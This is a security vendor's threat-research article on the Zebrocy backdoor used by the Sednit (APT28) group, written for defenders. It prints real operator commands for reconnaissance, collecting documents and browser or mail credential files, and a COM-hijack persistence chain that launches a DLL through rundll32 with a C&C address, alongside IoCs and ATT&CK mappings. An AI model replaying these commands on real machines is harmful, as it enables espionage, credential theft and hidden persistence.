2019/6/3 A journey to Zebrocy land | WeLiveSecurity

(https://www.welivesecurity.com/)

A journey to Zebrocy land

ESET sheds light on commands used by the favorite backdoor of the Sednit group

https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 1/11



2019/6/3 A journey to Zebrocy land | WeLiveSecurity

What happens when a victim is compromised by a backdoor and the operator is controlling it? It’s a difficult question that is
not possible to answer entirely by reverse engineering the code. In this article we will analyze commands sent by the
operator to their targets.

The Sednit group – also known as APT28, Fancy Bear, Sofacy or STRONTIUM – has been operating since at least 2004 and
has made headlines frequently in past years.

Recently, we unveiled the existence of a UEFI rootkit, called LoJax (https://www.welivesecurity.com/2018/09/27/lojax­first­
uefi­rootkit­found­wild­courtesy­sednit­group/), which we attribute to the Sednit group. This is a first for an APT group,
and shows Sednit has access to very sophisticated tools to conduct its espionage operations.

Three years ago, the Sednit group unleashed new components targeting victims in various countries in the Middle East and
Central Asia. Since then, the number and diversity of components has increased drastically. ESET
(https://www.welivesecurity.com/2018/04/24/sednit­update­analysis­zebrocy/) researchers
(https://www.welivesecurity.com/2018/11/20/sednit­whats­going­zebrocy/) and colleagues from other
(https://securelist.com/masha­and­these­bears/84311/) companies (https://unit42.paloaltonetworks.com/sofacy­creates­
new­go­variant­of­zebrocy­tool/) have documented these components; however, in this article we will focus on what’s
beyond the compromise, what the operators do once a victim system is running a Zebrocy Delphi backdoor.

The bear’s bait

At the end of August 2018, the Sednit group launched a spearphishing email campaign where it distributed shortened URLs
that delivered the first stage of Zebrocy components. In the past, Sednit used a similar technique for credential phishing
(https://www.welivesecurity.com/wp­content/uploads/2016/10/eset­sednit­full.pdf). However, it is unusual for the group to
use this technique to deliver one of its malware components directly. Previously, it had used exploits to deliver and execute
the first stage malware, while in this campaign the group relied entirely on social engineering to lure victims into running the
first part of the chain. The screenshot in Figure 1 shows Bitly statistics for the shortened URL used in this campaign.

(https://www.welivesecurity.com/wp­content/uploads/2019/05/Figure­1­WM.png)

Figure 1. Statistics of the Bitly URL

https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 2/11



2019/6/3 A journey to Zebrocy land | WeLiveSecurity

About 20 clicks were recorded on this link in the same week that the URL was created, and these presumably downloaded
the target archive. Let’s keep in mind that this may mean fewer than 20 potential victims, as victims may have clicked on the
URL twice, or maybe even more times, because the outcome was not what they expected… as we will describe below.

While ESET telemetry data indicates that this URL was delivered by spearphishing emails, we don’t have a sample of such an
email. The shortened URL leads the victim to an IP­address­based URL, where the archived payload is located.

Unfortunately, without the email message, we don’t know if there are any instructions for the user, if there is any further
social engineering, or if it relies solely on the victim’s curiosity. The archive contains two files; the first is an executable file,
while the second is a decoy PDF document.

(https://www.welivesecurity.com/wp­
content/uploads/2019/05/Figure­2­
WM.png)

Figure 2. Files extracted from the
archive (Google Translate
suggests “CATALOGUE –

(2018).exe” and “Order 97.pdf”
from the Ukrainian)

Note there is a typo in the executable’s filename; it should be “ДОВIДНИК” instead of “ДОВIДНIК”. Once the binary is
executed, a password prompt dialog box opens. The result of the password validation will always be wrong, but after the
apparent validation attempt, the decoy PDF document is opened. That document appears to be empty, but the downloader,
which is written in Delphi, continues running in the background. The IP address is also used in the URL hardcoded into the
first binary downloader.

The bear’s lair

The Stage­1 downloader will download and execute a new downloader, written in C++, not so different from other Zebrocy
downloaders. Once again this downloader is as straightforward as the Zebrocy gang’s other downloaders. It creates an ID
and it downloads a new, interesting backdoor, (this time) written in Delphi.

As we explained in our most recent blogpost (https://www.welivesecurity.com/2018/11/20/sednit­whats­going­zebrocy/)
about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex­
encoded, encrypted blobs. These blobs contain the different parts of the configuration.

https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 3/11



2019/6/3 A journey to Zebrocy land | WeLiveSecurity

(https://www.welivesecurity.com/wp­
content/uploads/2019/05/Figure­
3­WM.png)

Figure 3. Overview of
the resource section

Once the backdoor sends basic information about its newly compromised system, the operators take control of the
backdoor and start to send commands right away.

Hence, the time between the victim running the downloader and the operators’ first commands is only a few minutes.

How the bear hunts

https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 4/11



2019/6/3 A journey to Zebrocy land | WeLiveSecurity

In this section we describe in more detail the commands performed manually by the operators through their Delphi
backdoor.

The commands available are located in one of the configuration blobs mentioned earlier (the “commands” blob in Figure 3).
The number of supported commands has increased over time, with the latest version of the backdoor having more than
thirty. As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing
them manually.

The first set of commands gathers information about the victim’s computer and environment:

Commands Arguments

SCREENSHOT None

SYS_INFO None

GET_NETWORK None

SCAN_ALL None

The commands above are commonly executed when the operators first connect to a newly activated backdoor. They don’t
have any arguments, and they are quite self­explanatory. Other commands commonly seen executed shortly after these
backdoors are activated, listed below:

Commands Arguments

HKEY_CURRENT_USER  
REG_GET_KEYS_VALUES

Software\Microsoft\Windows\CurrentVersion

c:\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg;*.jpeg; 
*.bmp;*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;*.lhz; 

DOWNLOAD_DAY(30)  
d:\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg;*.jpeg; 
*.bmp;*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;*.lhz;

 
c:\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg*.jpeg 
*.bmp*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf; 

DOWNLOAD_DAY(1)
 
d:\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg*.jpeg 
*.bmp*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf; 

echo %APPDATA% 
CMD_EXECUTE ipconfig /all 

netstat ­aon

wmic process get Caption,ExecutablePath 
CMD_EXECUTE reg query 

"HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /s

https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 5/11



2019/6/3 A journey to Zebrocy land | WeLiveSecurity

Those who already have read our previous articles about Zebrocy will notice that more or less the same kind of information
is sent, over and over again by previous stages. This information is requested within a few minutes of initial compromise and
the amount of data the operator will have to deal with is quite considerable.

In order to collect even more information, from time to time the Zebrocy operators upload and use dumpers on victims’
machines. The current dumpers have some similarities with those previously used by the group. In this case, Yandex Browser,
Chromium, 7Star Browser (a Chromium­based browser), and CentBrowser are targeted, as well as versions of Microsoft Outlook
from 1997 through 2016:

Command Arguments

C:\ProgramData\Office\MS\msoffice.exe 
UPLOAD_AND_EXECUTE_FILE […] 

4D5A9000… 

These dumpers create log files indicating the presence or absence of potential databases to dump:

Command Arguments

C:\ProgramData\Office\MS\out.txt 
DOWNLOAD_LIST

C:\ProgramData\Office\MS\text.txt

The current dumper contains the following output when there are no databases to dump:

%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default\Login Data not found 
%LOCALAPPDATA%\Chromium\User Data\Default\Login Data not found 
%LOCALAPPDATA%\7Star\7Star\User Data\Default\Login Data not found 
%LOCALAPPDATA%\CentBrowser\User Data\Default\Login Data not found

These dumpers are quickly removed once they have done their job. Moreover, the backdoor contains a list of filenames
related to credentials from software listed below (database names):

key3.db Firefox private keys (now named key4.db)

cert8.db Firefox certificate database

logins.json Firefox encrypted password database

account.cfn The Bat! (email client) account credentials

wand.dat Opera password database

The operators take care of retrieving these databases if they are present on the victim’s computer.

https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 6/11



2019/6/3 A journey to Zebrocy land | WeLiveSecurity

Command Arguments

  %APPDATA%\The Bat!\Account.CFN 
DOWNLOAD_LIST %APPDATA%\The Bat!\[REDACTED]\Account.CFN

The operators retrieve these files on the machine using the DOWNLOAD_LIST command. This command can be used when
the operators are aware of the presence of interesting files on the computer.

Finally, depending on how interesting the victim is, they malware operators may deploy another custom backdoor. This
backdoor is executed using the CMD_EXECUTE command:

Command Arguments

reg add "HKCU\Software\Classes\CLSID\{0CD069CF-AC9B-41F4-9571-3A95A62C36A1}" /ve /d "Reliability Maintenance Co
ntrol Panel" /reg:64 /f&&reg add "HKCU\Software\Classes\CLSID\{0CD069CF-AC9B-41F4-9571-3A95A62C36A1}\InProcServ
er32" /ve /d "%APPDATA%\Microsoft\WinSupport\RMC\mtrcpl.dll" /reg:64 /f&&reg add "HKCU\Software\Classes\CLSID\

CMD_EXECUTE {0CD069CF-AC9B-41F4-9571-3A95A62C36A1}\InProcServer32" /v "ThreadingModel" /t REG_SZ /d "Both" /reg:64 /f
rundll32.exe "%APPDATA%\Microsoft\WinSupport\RMC\mtrcpl.dll",#1 687474703A2F2F[REDACTED]
dir /s /b /o:gn %APPDATA%\Microsoft\

There are some interesting facts here. First, they use COM object hijacking to make the malware persistent on the system
even though the custom backdoor is installed only for a few hours. Second, the hex­encoded string is the C&C used by the
custom backdoor while in the Delphi backdoor the C&C is embedded in the configuration.

The two Delphi backdoors, the common one and the one above, are quite similar but contain these interesting tweaks:

  Delphi backdoor Downloaded Delphi backdoor

Delphi compiler version 14.0­15.0 32.0

32/64­bit 32­bit 64­bit

Configuration location resource section no config (C&C is passed as an argument)

Number of commands 5 3

Encryption algorithm AES ECB custom

Lifetime on the computer a few days a few hours

Once again, it’s not very clear what the purpose of this custom backdoor is. The detection ratio is definitely lower in
comparison to the “usual” backdoor. The very short timeframe where this backdoor is on the system and operating makes it
harder to retrieve. Once its operators complete their evil deeds, they quickly remove it.

Summary

https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 7/11



2019/6/3 A journey to Zebrocy land | WeLiveSecurity

Observing commands used in the wild by the operator is quite interesting. They are gathering a considerable amount of
information on the compromised target and they are not worried about duplicated data. It shows a large gap between the
development strategy and what operators do in practice. Backdoors with custom configuration and modules are deployed
very carefully, which indicates some precautions to avoid ending up in the hands of researchers.

The first set of commands is the same and executed during a very short timeframe, which raises another question: is it
automated?

Indicators of Compromise (IoCs)

Distribution URL

http://45.124.132[.]127/DOVIDNIK ­ (2018).zip

C&C server

http://45.124.132[.]127/action­center/centerforserviceandaction/service­and­action.php

SHA­1 ESET detection names

48f8b152b86bed027b9152725505fbf4a24a39fd Win32/TrojanDownloader.Sednit.CMT

1e9f40ef81176190e1ed9a0659473b2226c53f57 Win32/HackTool.PSWDump.D

bfa26857575c49abb129aac87207f03f2b062e07 Win32/PSW.Agent.OGE

MITRE ATT&CK techniques

Tactic ID Name Description

Spearphishing emails using a URL­shortener service to
Initial T1192

Spearphishing Link trick the victim into clicking on a link to a zip file
Access (https://attack.mitre.org/techniques/T1192/)

containing malicious files.

T1204 Tricks users into running an executable with an icon
User Execution

(https://attack.mitre.org/techniques/T1204/) that looks like a Microsoft Word document.

T1085 rundll32.exe has been used to run a new, downloaded,
Rundll32

(https://attack.mitre.org/techniques/T1085/) malicious DLL.

Execution
Windows

T1047
Management WMI commands to gather victim host details.

(https://attack.mitre.org/techniques/T1047/)
Instrumentation

T1053
Scheduled Task Schedule task to execute malicious binaries.

(https://attack.mitre.org/techniques/T1053/)

https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 8/11



2019/6/3 A journey to Zebrocy land | WeLiveSecurity

Tactic ID Name Description

Registry key
T1060 Registry Run Keys /

HKCU\Software\Microsoft\CurrentVersion\Run\ used
(https://attack.mitre.org/techniques/T1060/) Startup Folder

for persistence.
Persistence

T1122 Component Object
COM hijacking for persistence.

(https://attack.mitre.org/techniques/T1122/) Model Hijacking

T1107
File Deletion Deletes files (binaries and files created) after usage.

(https://attack.mitre.org/techniques/T1107/)
Defense
Evasion

T1089 Disabling Security
Kills processes

(https://attack.mitre.org/techniques/T1089/) Tools

T1012
Query Registry Registry keys enumeration

(https://attack.mitre.org/techniques/T1012/)

T1057
Process Discovery Lists running processes

(https://attack.mitre.org/techniques/T1057/)

Discovery
System

T1082 Uses systeminfo command to gather information about
Information

(https://attack.mitre.org/techniques/T1082/) the victim.
Discovery

T1083 File and Directory Uses echo ENV command to list the content of a
(https://attack.mitre.org/techniques/T1083/) Discovery directory.

T1005 Data from Local
Scans files that match extensions listed in the malware.

(https://attack.mitre.org/techniques/T1005/) System

Data from
T1039 Enumerates remote and local drives and then exfiltrates

Network Shared
(https://attack.mitre.org/techniques/T1039/) files matching specific extensions.

Drive

T1025 Data from Enumerates remote and local drives and then exfiltrates
(https://attack.mitre.org/techniques/T1025/) Removable Media files matching specific extensions.

Collection

T1074
Data Staged Creates file containing path of all files to exfiltrate.

(https://attack.mitre.org/techniques/T1074/)

T1056
Input Capture Keylogger feature.

(https://attack.mitre.org/techniques/T1056/)

T1113
Screen Capture Screenshot feature.

(https://attack.mitre.org/techniques/T1113/)

T1020 Automated Automatically prepare a file with all file paths to retrieve
(https://attack.mitre.org/techniques/T1020/) Exfiltration and send it.

T1022 Data sent are hex­encoded, encrypted with a known
Data Encrypted

Exfiltration (https://attack.mitre.org/techniques/T1022/) algorithm or a custom one.

Exfiltration Over
T1041

Command and Data are exfiltrated to a C&C server.
(https://attack.mitre.org/techniques/T1041/)

Control Channel

Command T1043 Commonly Used Downloaders and backdoors use ports 80 or 443 to
And (https://attack.mitre.org/techniques/T1043/) Port communicate with the C&C server.
Control

Custom
T1024 Data sent are hex encoded, encrypted with AES or a

Cryptographic
(https://attack.mitre.org/techniques/T1024/) custom algorithm.

Protocol

https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 9/11



2019/6/3 A journey to Zebrocy land | WeLiveSecurity

Tactic ID Name Description

T1132 Data sent are hex­encoded, encrypted with a known
Data Encoding

(https://attack.mitre.org/techniques/T1132/) algorithm or a custom one.

T1001 Data sent are hex­encoded, encrypted with a known
Data Obfuscation

(https://attack.mitre.org/techniques/T1001/) algorithm or a custom one.

T1008
Fallback Channels A fallback C&C server is embedded in the configuration.

(https://attack.mitre.org/techniques/T1008/)

T1079 Multilayer Data sent are hex­encoded, encrypted with a known
(https://attack.mitre.org/techniques/T1079/) Encryption algorithm or a custom one.

Standard
T1071

Application Layer HTTP, HTTPS are used to communicate.
(https://attack.mitre.org/techniques/T1071/)

Protocol

Standard
T1032 Data sent are hex­encoded, encrypted with a known

Cryptographic
(https://attack.mitre.org/techniques/T1032/) algorithm or a custom one.

Protocol



ESET Research (https://www.welivesecurity.com/author/esetresearch/) 22 May 2019 ­ 11:30AM

Similar Articles

MALWARE MALWARE MALWARE MALWARE
(HTTPS://WWW.WELIVESECURITY (HTTPS://WWW.WELIVESECURITY (HTTPS://WWW.WELIVESECURITY (HTTPS://WWW.WELIVESECURITY

(https://www.welivesecurity.com (https://www.welivesecurity.com (https://www.welivesecurity.com (https://www.welivesecurity.com
powershell­usage/) cryptocurrency­apps­google­ malware­mitm­asus­ lightneuron­email­too­far/)

play­bitcoin/) webstorage/)
A dive into Turla PowerShell Turla LightNeuron: An email too
usage Fake cryptocurrency apps crop up Plead malware distributed via far
(https://www.welivesecurity.com/2019o/n0 5G/o2o9g/tleu rPlala­y as bitcoin price MitM attacks at router level, (https://www.welivesecurity.com/2019
powershell­usage/) rises misusing ASUS WebStorage lightneuron­email­too­far/)

(https://www.welivesecurity.com/2019(/h0tt5p/s2:3//fwakwew­ .welivesecurity.com/2019/05/14/plead­
cryptocurrency­apps­google­ malware­mitm­asus­
play­bitcoin/) webstorage/)

Discussion

https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 10/11



2019/6/3 A journey to Zebrocy land | WeLiveSecurity
What do you think?

5 Responses

Upvote Funny Love Surprised Angry Sad

0 Comments WeLiveSecurity.com 1 Login

 Recommend t Tweet f Share Sort by Best

 Start the discussion…
LOG IN WITH OR SIGN UP WITH DISQUS ?

Name

Be the first to comment.

✉ Subscribe d Add Disqus to your siteAdd DisqusAdd   Disqus' Privacy PolicyPrivacy PolicyPrivacy

 (https://www.welivesecurity.com/)

Home (/) Research (https://www.welivesecurity.com/research/)

About Us (https://www.welivesecurity.com/about­us/) How To (https://www.welivesecurity.com/category/how­
to/)

Contact Us (https://www.welivesecurity.com/contact­us/)
Categories (https://www.welivesecurity.com/categories/)

Sitemap (https://www.welivesecurity.com/sitemap/)
RSS Configurator (https://www.welivesecurity.com/rss­

Our Experts (https://www.welivesecurity.com/our­ configurator/)
experts/)

News Widget (https://www.welivesecurity.com/news­
ESET (https://eset.com) widget­generator/)

()

Privacy policy (https://www.welivesecurity.com/privacy/) Legal Information (https://www.welivesecurity.com/legal­
information/)

Copyright © ESET, All Rights Reserved

https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/ 11/11